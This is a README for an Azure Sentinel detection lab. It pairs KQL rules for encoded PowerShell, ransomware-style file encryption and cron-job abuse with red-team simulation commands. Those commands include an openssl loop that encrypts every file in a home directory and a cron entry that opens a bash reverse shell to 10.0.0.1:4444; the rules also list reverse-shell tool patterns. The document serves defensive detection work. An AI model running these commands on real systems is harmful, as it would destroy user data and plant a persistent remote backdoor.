# Azure Sentinel Detection Engineering Lab

This repository contains KQL detection rules mapped to MITRE ATT&CK framework for Azure Sentinel SOC operations.

## Detections

| MITRE ID | Rule Name | File |
| --- | --- | --- |
| T1059.001 | Encoded PowerShell | `KQL-Rules/T1059-Encoded-PowerShell.kql` |
| T1486 | Ransomware Activity | `KQL-Rules/T1486-Ransomware-Detection.kql` |
| T1053.003 | Cron Job Abuse | `detections/T1053-Scheduled-Task/T1053.003-Cron-Abuse.kql` |

### 1. T1059.001 - Encoded PowerShell Command Detection

**Red Team Simulation:**
powershell
powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAA...
SecurityEvent
| where EventID == 4688
| where CommandLine has "-EncodedCommand" or CommandLine has "-enc"
| extend MITRE_Tactic = "Execution"
| extend MITRE_Technique_ID = "T1059.001"
for file in /home/user/*; do openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc"; done
SysmonEvent
| where EventID == 11
| where TargetFilename endswith ".enc" or TargetFilename endswith ".locked"
| summarize FileCount = count() by Computer, Account, bin(TimeGenerated, 1m)
| where FileCount > 20
| extend MITRE_Tactic = "Impact"
| extend MITRE_Technique_ID = "T1486"
echo "* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" > /etc/cron.d/backdoor
// Alert: Malicious Cron Job Execution
SysmonEvent
| where EventID == 1
| where ParentImage has "/usr/sbin/cron"
| where CommandLine has_any ("nc", "bash -i", "/dev/tcp/")
| extend MITRE_Tactic = "Persistence"
| extend MITRE_Technique_ID = "T1053.003"
